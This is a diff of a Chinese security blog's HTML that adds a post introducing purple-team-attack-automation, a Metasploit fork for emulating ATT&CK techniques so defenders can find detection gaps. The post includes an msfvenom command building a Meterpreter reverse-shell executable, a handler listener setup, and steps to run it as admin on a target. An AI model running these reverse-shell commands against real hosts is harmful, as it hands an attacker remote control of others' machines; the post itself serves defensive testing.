@@ -179,6 +179,217 @@
             
 
   
+    <article id="post-20200107" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class=" article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	      <a class="article-title" href="/2020/01/07/20200107/" target="_blank">purple-team-attack-automation(紫色团队攻击自动化)学习与研究</a>
+        
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/01/07/20200107/" class="archive-article-date">
+        <time datetime="2020-01-07T12:53:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-07</time>
+</a>
+
+  
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>该工具是原始metasploit框架的分支，用于模拟攻击者的战术，技术和程序（TTP）。该工具的主要重点是帮助Blue Teams了解其映射到MITER ATT＆CK™框架的检测差距。</p>
+<h2 id="2-可用模块"><a href="#2-可用模块" class="headerlink" title="2. 可用模块"></a>2. 可用模块</h2><h3 id="2-1-Windows"><a href="#2-1-Windows" class="headerlink" title="2.1 Windows"></a>2.1 Windows</h3><ul>
+<li>Windows：ADIDNS（PowerMad）</li>
+<li>Windows：Active Directory自动发现（BloodHound）</li>
+<li>Windows：数据压缩（T1002）</li>
+<li>Windows：凭证转储（T1003）</li>
+<li>Windows：Winlogon帮助器DLL（T1004）</li>
+<li>Windows：来自本地系统的数据（T1005）</li>
+<li>Windows：系统服务发现（T1007）</li>
+<li>Windows：应用程序窗口发现（T1010）</li>
+<li>Windows：查询注册表（T1012）</li>
+<li>Windows：端口监视器（T1013）</li>
+<li>Windows：辅助功能（T1015）</li>
+<li>Windows：系统网络配置发现（T1016）</li>
+<li>Windows：远程系统发现（T1018）</li>
+<li>Windows：快捷方式修改（T1023）</li>
+<li>Windows：Windows远程管理（T1028）</li>
+<li>Windows：修改现有服务（T1031）</li>
+<li>Windows：系统所有者/用户发现（T1033）</li>
+<li>Windows：路径拦截（T1034）</li>
+<li>Windows：服务执行（T1035）</li>
+<li>Windows：伪装（T1036）</li>
+<li>Windows：登录脚本（T1037）</li>
+<li>Windows：文件系统权限不足（T1044）</li>
+<li>Windows：Windows管理规范（T1047）</li>
+<li>Windows：系统网络连接发现（T1049）</li>
+<li>Windows：新服务（T1050）</li>
+<li>Windows：计划任务（T1053）</li>
+<li>Windows：流程注入（T1055）</li>
+<li>Windows：输入捕获（T1056）</li>
+<li>Windows：进程发现（T1057）</li>
+<li>Windows：运行键（T1060）</li>
+<li>Windows：安全软件发现（T1063）</li>
+<li>Windows：权限组发现（T1069）</li>
+<li>Windows：从工具中删除指示器（T1070）</li>
+<li>Windows：通过哈希（T1075）</li>
+<li>Windows：Windows管理员共享（T1077）</li>
+<li>Windows：有效帐户（T1078）</li>
+<li>Windows：文件中的凭据（T1081）</li>
+<li>Windows：系统信息发现（T1082）</li>
+<li>Windows：文件和目录发现（T1083）</li>
+<li>Windows：Windows管理规范事件订阅（1084）</li>
+<li>Windows：Rundll32（T1085）</li>
+<li>Windows：PowerShell（T1086）</li>
+<li>Windows：帐户发现（T1087）</li>
+<li>Windows：绕过UAC（T1088）</li>
+<li>Windows：禁用安全工具（T1089）</li>
+<li>Windows：Windows NTFS扩展属性（T1096）</li>
+<li>Windows：帐户操作（T1098）</li>
+<li>Windows：Timestomp（T1099）</li>
+<li>Windows：AppInit DLL（T1103）</li>
+<li>Windows：远程文件复制（T1105）</li>
+<li>Windows：文件删除（T1107）</li>
+<li>Windows：暴力破解（T1110）</li>
+<li>Windows：修改注册表（T1112）</li>
+<li>Windows：屏幕捕获（T1113）</li>
+<li>Windows：剪贴板数据（T1115）</li>
+<li>Windows：Regsvr32（T1117）</li>
+<li>Windows：InstallUtil（T1118）</li>
+<li>Windows：自动收集（T1119）</li>
+<li>Windows：外围设备发现（T1120）</li>
+<li>Windows：Regsvcs/Regasm（T1121）</li>
+<li>Windows：音频捕获（T1123）</li>
+<li>Windows：系统时间发现（T1124）</li>
+<li>Windows：视频捕获（T1125）</li>
+<li>Windows：受信任的开发人员实用程序（T1127）</li>
+<li>Windows：安装根证书（T1130）</li>
+<li>Windows：身份验证程序包（T1131）</li>
+<li>Windows：网络共享发现（T1135）</li>
+<li>Windows：创建帐户（T1136）</li>
+<li>Windows：MSHTA（T1170）</li>
+<li>Windows：分布式组件对象模型（T1175）</li>
+<li>Windows：屏幕保护程序（T1180）</li>
+<li>Windows：CMSTP（T1191）</li>
+<li>Windows：控制面板项目（T1196）</li>
+<li>Windows：BITS作业（T1197）</li>
+<li>Windows：密码策略发现（T1201）</li>
+<li>Windows：Kerberoasting（T1208）</li>
+<li>Windows：时间提供者（T1209）</li>
+<li>Windows：签名的二进制代理执行（T1218）</li>
+</ul>
+<h3 id="2-2-Linux"><a href="#2-2-Linux" class="headerlink" title="2.2 Linux"></a>2.2 Linux</h3><ul>
+<li>Linux：系统网络配置发现（T1016）</li>
+<li>Linux：系统所有者/用户发现（T1033）</li>
+<li>Linux：系统网络连接发现（T1049）</li>
+<li>Linux：进程发现（T1057）</li>
+<li>Linux：权限组发现（T1069）</li>
+<li>Linux：系统信息发现（T1082）</li>
+<li>Linux：帐户发现（T1087）</li>
+<li>Linux：文件删除（T1107）</li>
+<li>Linux：密码策略发现（T1201）</li>
+</ul>
+<h3 id="2-3-MacOS"><a href="#2-3-MacOS" class="headerlink" title="2.3 MacOS"></a>2.3 MacOS</h3><ul>
+<li>macOS：数据压缩（T1002）</li>
+<li>macOS：系统网络配置发现（T1016）</li>
+<li>macOS：网络共享发现（T1135）</li>
+<li>macOS：创建帐户（T1136）</li>
+<li>macOS：Bash历史记录（T1139）</li>
+<li>macOS：密码策略发现（T1201）</li>
+</ul>
+<h3 id="2-4-Multi"><a href="#2-4-Multi" class="headerlink" title="2.4 Multi"></a>2.4 Multi</h3><ul>
+<li>Multi：远程系统发现（T1018）</li>
+<li>Multi：网络服务扫描（T1046）</li>
+</ul>
+<p>具体可参考官方wiki介绍：<a href="https://github.com/praetorian-code/purple-team-attack-automation/wiki/Available-Modules" target="_blank" rel="noopener">https://github.com/praetorian-code/purple-team-attack-automation/wiki/Available-Modules</a></p>
+<h2 id="2-工具部署及安装方法"><a href="#2-工具部署及安装方法" class="headerlink" title="2.工具部署及安装方法"></a>2.工具部署及安装方法</h2><h3 id="2-1-docker-docker-compose安装"><a href="#2-1-docker-docker-compose安装" class="headerlink" title="2.1 docker/docker-compose安装"></a>2.1 docker/docker-compose安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker docker-compose</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-下载项目文件至本地"><a href="#2-2-下载项目文件至本地" class="headerlink" title="2.2 下载项目文件至本地"></a>2.2 下载项目文件至本地</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/praetorian-code/purple-team-attack-automation.git</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-修改LHOST和端口"><a href="#2-3-修改LHOST和端口" class="headerlink" title="2.3 修改LHOST和端口"></a>2.3 修改LHOST和端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"version: '3'</span></span><br><span class="line"><span class="string">services:</span></span><br><span class="line"><span class="string">  ms:</span></span><br><span class="line"><span class="string">    environment:</span></span><br><span class="line"><span class="string">    # example of setting LHOST</span></span><br><span class="line"><span class="string">      LHOST: 0.0.0.0</span></span><br><span class="line"><span class="string">    # example of adding more ports</span></span><br><span class="line"><span class="string">    ports:</span></span><br><span class="line"><span class="string">      - 8080:8080</span></span><br><span class="line"><span class="string">      - 443:443</span></span><br><span class="line"><span class="string">      - 80:80</span></span><br><span class="line"><span class="string">"</span> &gt; docker-compose.local.override.yml <span class="comment">#此文件需要自行创建，然后复制上述内容写入文档即可</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-设置COMPOSE-FILE环境变量"><a href="#2-4-设置COMPOSE-FILE环境变量" class="headerlink" title="2.4 设置COMPOSE_FILE环境变量"></a>2.4 设置COMPOSE_FILE环境变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"COMPOSE_FILE=./docker-compose.yml:./docker-compose.override.yml:./docker-compose.local.override.yml"</span> &gt;&gt; .env</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-运行docker服务并运行工具"><a href="#2-5-运行docker服务并运行工具" class="headerlink" title="2.5 运行docker服务并运行工具"></a>2.5 运行docker服务并运行工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br><span class="line">docker-compose build</span><br><span class="line">./docker/bin/msfconsole <span class="comment">#当前目录下执行此命令</span></span><br></pre></td></tr></table></figure>
+
+<p>其他环境安装可参考官方说明：<a href="https://github.com/praetorian-code/purple-team-attack-automation/wiki/Installation" target="_blank" rel="noopener">https://github.com/praetorian-code/purple-team-attack-automation/wiki/Installation</a></p>
+<h2 id="3-操作与使用"><a href="#3-操作与使用" class="headerlink" title="3. 操作与使用"></a>3. 操作与使用</h2><h3 id="3-1-生成Meterpreter有效载荷"><a href="#3-1-生成Meterpreter有效载荷" class="headerlink" title="3.1 生成Meterpreter有效载荷"></a>3.1 生成Meterpreter有效载荷</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your locahost IP&gt; LPORT=4444 -f exe &gt; meterpreter.exe  <span class="comment">#新建窗口执行命令，利用此命令生成的MSF载荷可能存在问题，建议自行修改</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-启动并运行本地监听"><a href="#3-2-启动并运行本地监听" class="headerlink" title="3.2 启动并运行本地监听"></a>3.2 启动并运行本地监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> Interrupt: use the <span class="string">'exit'</span> <span class="built_in">command</span> to quit</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;Attacker IP Address&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit -j -z</span><br><span class="line"><span class="comment"># docker msfconsole中执行监听命令</span></span><br></pre></td></tr></table></figure>
+
+<p>复制并在目标（“受害者”）主机上以管理员身份运行meterpreter.exe，然后等待会话。</p>
+<h3 id="3-3-查看已有TTP模块"><a href="#3-3-查看已有TTP模块" class="headerlink" title="3.3 查看已有TTP模块"></a>3.3 查看已有TTP模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search purple</span><br><span class="line"><span class="comment"># docker msfconsole中执行</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-模拟T1087"><a href="#3-4-模拟T1087" class="headerlink" title="3.4 模拟T1087"></a>3.4 模拟T1087</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use modules/post/windows/purple/t1087 <span class="comment">#设置要使用的TTP</span></span><br><span class="line">info <span class="comment">#查看TTP模块配置</span></span><br><span class="line"><span class="built_in">set</span> session 1  <span class="comment">#设置会话</span></span><br><span class="line">run <span class="comment">#执行载荷</span></span><br><span class="line"><span class="comment">#docker msfconsole中执行</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>安全从业人员（尤其是蓝队成员），可以利用purple-team-attack-automation模拟相关TTP，并在客户端部署并配置相关审核策略，记录相关事件日志（windows_log/sysmon/message），并转发至大数据分析平台（splunk/elk等）进行数据分析，提升蓝队成员对攻击的理解以及对异常行为的敏感度。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>关于purple-team-attack-automation(紫色团队攻击自动化)更多信息可参考项目原址介绍：<a href="https://github.com/praetorian-code/purple-team-attack-automation" target="_blank" rel="noopener">https://github.com/praetorian-code/purple-team-attack-automation</a></p>
+<p>关于ATT&amp;CK具体TTP中文介绍可参考瀚思科技MITRE ATT&amp;CK 攻击知识库（企业）中文版项目：<a href="https://hansight.github.io/#/" target="_blank" rel="noopener">https://hansight.github.io/#/</a></p>
+<p>关于ATT&amp;CK具体TTP原文介绍可参考MITER官方介绍：<a href="https://attack.mitre.org/" target="_blank" rel="noopener">https://attack.mitre.org/</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ATT&CK</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/01/07/20200107/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Year-end-summary" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1098,11 +1309,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">逃避追踪</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">终端日志分析</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">终端日志分析</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">逃避追踪</a>
         		</li>
       		
 		</ul>
@@ -3007,7 +3218,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018-2019 12306Bro
+    		&copy; 2018-2020 12306Bro
     	</div>
       	<div class="footer-right">
       		 by Litten
@@ -3106,15 +3317,19 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">ATT&CK</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">逃避追踪</a>
+                <a href="javascript:void(0)" class="js-tag color2">终端日志分析</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">终端日志分析</a>
+                <a href="javascript:void(0)" class="js-tag color5">逃避追踪</a>
               </li>
              
               <li class="article-tag-list-item">
